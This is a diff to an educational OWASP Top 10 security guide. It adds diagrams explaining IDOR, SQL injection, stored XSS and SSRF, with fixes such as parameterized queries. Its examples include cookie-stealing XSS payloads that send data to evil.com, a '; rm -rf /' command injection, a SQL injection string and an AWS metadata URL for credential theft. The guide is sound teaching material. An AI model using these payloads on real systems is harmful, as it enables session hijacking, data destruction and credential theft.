@@ -23,6 +23,30 @@ Common patterns:
 - A regular user accessing `/admin/dashboard` because the server only hides the link but doesn't check permissions
 - Modifying a POST body to include `"role": "admin"` during registration
 
+### Attack Flow
+
+```
+BROKEN ACCESS CONTROL:
+
+The vulnerability:
+  GET /api/users/42/profile  ← Alice views her own profile (user 42)
+  GET /api/users/43/profile  ← Alice changes 42 to 43... sees Bob's data!
+
+  ┌─────────┐     ┌──────────┐     ┌──────────┐
+  │ Alice   │────>│  Server  │────>│ Database │
+  │ (id=42) │     │          │     │          │
+  │         │     │ Checks:  │     │          │
+  │ Requests│     │ ✓ Logged │     │          │
+  │ id=43   │     │ ✗ Is 43  │     │ Returns  │
+  │         │     │   = 42?  │     │ Bob's    │
+  │         │<────│   NOPE.  │<────│ data!    │
+  └─────────┘     └──────────┘     └──────────┘
+
+  The server checked IF Alice is logged in.
+  It did NOT check if Alice SHOULD see user 43's data.
+  This is called an IDOR (Insecure Direct Object Reference).
+```
+
 ### Real-World Example
 
 In 2019, First American Financial Corporation exposed 885 million records because their document access system used sequential URLs. Changing the document number in the URL gave access to anyone's mortgage documents, Social Security numbers, and bank statements. No authentication bypass needed — just increment a number.
@@ -223,6 +247,63 @@ The attacker finds an input that gets incorporated into a command without proper
 - SQL injection: `' OR 1=1 --`
 - Command injection: `; rm -rf /`
 - XSS: `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`
+
+### Attack Flow
+
+```
+SQL INJECTION ATTACK FLOW:
+
+Normal request:
+  User types: "alice"
+  Query becomes: SELECT * FROM users WHERE name = 'alice'
+  Result: Alice's record ✓
+
+Attack request:
+  User types: ' OR '1'='1' --
+  Query becomes: SELECT * FROM users WHERE name = '' OR '1'='1' --'
+
+  What the database sees:
+  ┌──────────────────────────────────────────────────┐
+  │ SELECT * FROM users WHERE name = ''              │
+  │                           OR '1'='1'  ← always true!
+  │                           --'         ← rest is comment
+  └──────────────────────────────────────────────────┘
+  Result: ALL users returned. Entire database dumped.
+
+The fix — parameterized queries:
+  Query: SELECT * FROM users WHERE name = $1
+  Parameter: "' OR '1'='1' --"
+
+  The database treats the ENTIRE input as a literal string.
+  No part of it is interpreted as SQL. The attack string
+  becomes just a weird name to search for (no results).
+```
+
+```
+XSS ATTACK FLOW (Stored XSS):
+
+Step 1: Attacker posts a "comment" containing JavaScript
+  Comment: "Nice post! <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"
+
+Step 2: Server stores it in the database (no sanitization)
+
+Step 3: Victim loads the page
+  ┌─────────┐     ┌──────────┐     ┌──────────────┐
+  │ Victim  │────>│  Server  │────>│  Database    │
+  │ Browser │     │  sends   │     │  returns     │
+  │         │<────│  page +  │<────│  comment     │
+  │         │     │  comment │     │  with script │
+  └────┬────┘     └──────────┘     └──────────────┘
+       │
+       │ Browser executes the script!
+       v
+  ┌──────────┐
+  │ evil.com │ ← receives victim's session cookie
+  └──────────┘
+
+  Now the attacker has the victim's session.
+  They can log in AS the victim.
+```
 
 ### Real-World Example
 
@@ -637,6 +718,35 @@ SSRF happens when an attacker can make your server send requests to unintended d
 4. Server fetches internal resources and returns them to the attacker
 5. Attacker now has cloud credentials, internal service data, or can scan the internal network
 
+### Attack Flow
+
+```
+SSRF ATTACK FLOW:
+
+Normal usage:
+  User: "Fetch this URL: https://example.com/image.png"
+  Server: fetches image, returns to user ✓
+
+Attack:
+  User: "Fetch this URL: http://169.254.169.254/latest/meta-data/"
+
+  ┌──────────┐        ┌──────────┐        ┌──────────────────┐
+  │ Attacker │──req──>│  Your    │──req──>│ AWS Metadata     │
+  │ (outside)│        │  Server  │        │ Service (inside) │
+  │          │<─resp──│          │<─resp──│                  │
+  └──────────┘        └──────────┘        └──────────────────┘
+
+  Your server is INSIDE the network.
+  The metadata service trusts internal requests.
+  The attacker uses YOUR server as a proxy
+  to reach internal services they can't access directly.
+
+  169.254.169.254 = AWS instance metadata
+  Returns: IAM credentials, API keys, instance identity
+
+  This is how Capital One was breached in 2019 (100M records).
+```
+
 ### Real-World Example
 
 The 2019 Capital One breach (100 million records) was an SSRF attack. The attacker exploited a misconfigured WAF to send requests to the AWS metadata service, obtained temporary credentials, and used those to access S3 buckets containing customer data.
@@ -654,6 +764,36 @@ The 2019 Capital One breach (100 million records) was an SSRF attack. The attack
 ---
 
 ## Summary: The Security Mindset
+
+```
+OWASP TOP 10 AT A GLANCE:
+
+  Attack Surface Map:
+
+  User Input ──────────> [Injection, XSS]
+  Authentication ──────> [Broken Auth, Credential Stuffing]
+  Authorization ───────> [Broken Access Control, IDOR]
+  Server Config ───────> [Misconfiguration, Default Creds]
+  Dependencies ────────> [Vulnerable Components, Supply Chain]
+  Data Storage ────────> [Sensitive Data Exposure, Weak Crypto]
+  Server-side Requests > [SSRF]
+  Logging ─────────────> [Insufficient Monitoring]
+
+  Defense layers:
+  ┌─────────────────────────────────────────────────┐
+  │ WAF (Web Application Firewall)                  │  ← Network edge
+  ├─────────────────────────────────────────────────┤
+  │ Input validation + output encoding              │  ← Application
+  ├─────────────────────────────────────────────────┤
+  │ Authentication + Authorization                  │  ← Identity
+  ├─────────────────────────────────────────────────┤
+  │ Parameterized queries + ORM                     │  ← Data access
+  ├─────────────────────────────────────────────────┤
+  │ Dependency scanning + updates                   │  ← Supply chain
+  ├─────────────────────────────────────────────────┤
+  │ Logging + alerting + incident response          │  ← Detection
+  └─────────────────────────────────────────────────┘
+```
 
 The OWASP Top 10 isn't a checklist to complete once and forget. It's a framework for thinking about security throughout the development lifecycle.
 
